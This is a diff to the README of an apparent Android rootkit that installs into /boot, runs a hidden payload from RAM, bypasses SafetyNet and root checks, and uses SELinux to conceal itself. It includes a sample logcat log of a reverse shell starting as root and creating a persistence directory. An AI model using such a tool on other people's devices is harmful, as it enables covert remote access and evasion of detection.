@@ -11,7 +11,7 @@ Since it's operating within ramdisk, this tool can bypass most root checks, inte
 Unlike its predecessor, this rootkit can bypass SafetyNet, since it doesn't need to modify system partition. \
 However, it can't bypass hardware checks, such as hardware-backed SafetyNet on newer devices. 
 
-The daemon launches arbitrary executable in loop, while providing cover and execution control. 
+The daemon launches arbitrary executable from RAM, while providing cleanup, cover, and execution control. 
 It runs silently and normally leaves no traces in _dmesg_, _logcat_, etc., unlike regular services run by _init_ in loop.
 
 FURA uses SELinux to its own advantage: not only to bypass stock policy restrictions, but to hide itself from the rest of the system.
@@ -26,13 +26,14 @@ OS | Android | Boot scheme
 MIUI 11.0.2 | 7 | rootfs
 LineageOS 17.1 | 10 | 2SI
 LineageOS 19.0 | 12 | 2SI
+MIUI 14.0.2 | 12 | 2SI
 
 _Note_: if Magisk is installed on SAR or 2SI device, this tool will fallback to Magisk's `overlay.d`. It will use standard `magisk` context which is not hidden by SELinux policy. In this case, setting `hide_process_bind` is recommended (see `config.prop`).
 
 ## Features & Improvements
 
 - Installs entirely into _/boot_, does not modify _/system_ in any way
-- Operates in ramdisk without touching storage
+- Operates in RAM without touching storage
 - Employs a custom daemon to monitor payload execution
 - Modifies SELinux policy to hide itself
 - Installation and backup no longer depend on _/data_
@@ -41,9 +42,10 @@ _Note_: if Magisk is installed on SAR or 2SI device, this tool will fallback to 
 - Compatible with Magisk on device
 
 ## Limitations
-- Not hidden from root (files, mounts, etc.)
+
+- Not always hidden from root (processes, sockets, etc.)
 - On some systems _logcat_ may log random service name on boot
-- Sockets (if any) are not hidden, though specific process using network is
+- Sockets (if any) may not be hidden, though specific process using network is
 - Not hidden by SELinux policy if installed with Magisk on SAR / 2SI device
 
 ## Prerequisites
@@ -149,30 +151,31 @@ After boot is completed, you should be able to see its output:
 
 ```
 $ adb logcat | grep revshell
-03-18 00:34:41.732  2381  2381 D revshell_exec: Remounting /sbin to avoid mount detection ...
-03-18 00:34:41.732  2381  2381 D revshell_exec: Setting up /mnt/secure/temp
-03-18 00:34:41.732  2381  2381 D revshell_exec: Awaiting decryption ...
-03-18 00:34:41.732  2381  2381 D revshell_exec: Decrypted. Setting persistence dir at /data/adb/.aura
-03-18 00:34:46.817  2381  2381 I revshell_exec: restarting ...
-03-18 00:34:46.884  3197  3197 D revshell: Start successfull!
-03-18 00:34:46.885  3197  3197 D revshell: Signals are set to ignore
-03-18 00:34:46.885  3197  3197 D revshell: Hey I'm a revshell process!
-03-18 00:34:46.885  3197  3197 D revshell: My PID -- 3197
-03-18 00:34:46.885  3197  3197 D revshell: My parent PID -- 2381
-03-18 00:34:46.885  3197  3197 D revshell: My UID -- 0
-03-18 00:34:46.885  3197  3197 D revshell: Awaiting encrypted FS decryption now...
-03-18 00:34:51.241  2381  2381 D revshell_exec: Checking PID
-03-18 00:34:51.311  3197  3197 D revshell: FS has been decrypted!
-03-18 00:34:51.311  3197  3197 D revshell: Starting reverse shell now
-03-18 00:34:56.242  2381  2381 D revshell_exec: Checking PID
-03-18 00:34:56.312  3197  3197 D revshell: tick ! 10 seconds since process started
-03-18 00:35:01.244  2381  2381 D revshell_exec: Checking PID
-03-18 00:35:01.312  3197  3197 D revshell: tick ! 15 seconds since process started
+01-21 23:38:35.263   394   394 D revshell_exec: Executor is running
+01-21 23:38:35.263   394   394 D revshell_exec: Blocking signals
+01-21 23:38:35.263   394   394 D revshell_exec: Hiding init props
+01-21 23:38:35.267   394   394 D revshell_exec: memfd path: /proc/self/fd/4
+01-21 23:38:35.267   394   394 D revshell_exec: Setting up /mnt/secure/temp
+01-21 23:38:35.267   394   394 D revshell_exec: Awaiting decryption ...
+01-21 23:38:35.269   394   394 D revshell_exec: Decrypted. Setting persistence dir at /data/adb/.fura
+01-21 23:38:40.498   887   887 D revshell: Start successfull!
+01-21 23:38:40.498   887   887 D revshell: Signals are set to ignore
+01-21 23:38:40.498   887   887 D revshell: Hey I'm a revshell process!
+01-21 23:38:40.498   887   887 D revshell: My PID -- 887
+01-21 23:38:40.498   887   887 D revshell: My parent PID -- 394
+01-21 23:38:40.498   887   887 D revshell: My UID -- 0
+01-21 23:38:40.498   887   887 D revshell: Awaiting encrypted FS decryption now...
+01-21 23:38:41.444   394   394 D revshell_exec: Starting revshell ...
+01-21 23:38:45.502   887   887 D revshell: FS has been decrypted!
+01-21 23:38:45.502   887   887 D revshell: Starting reverse shell now
+01-21 23:38:46.445   394   394 D revshell_exec: Checking PID
+01-21 23:38:50.498   887   887 D revshell: tick ! 10 seconds since process started
+01-21 23:38:51.446   394   394 D revshell_exec: Checking PID
 ```
 
 On boot, temp and persistence directories are created:
 - `/mnt/secure/temp` - protected directory in _tmpfs_
-- `/data/adb/.fura` - directory to store arbitrary files persistently
+- `/data/adb/.fura` - directory to store arbitrary files persistently (set in `config.prop`)
 
 Both directories are protected by SELinux policy, so they might be inaccessible even to root (depends on the stock policy).
 
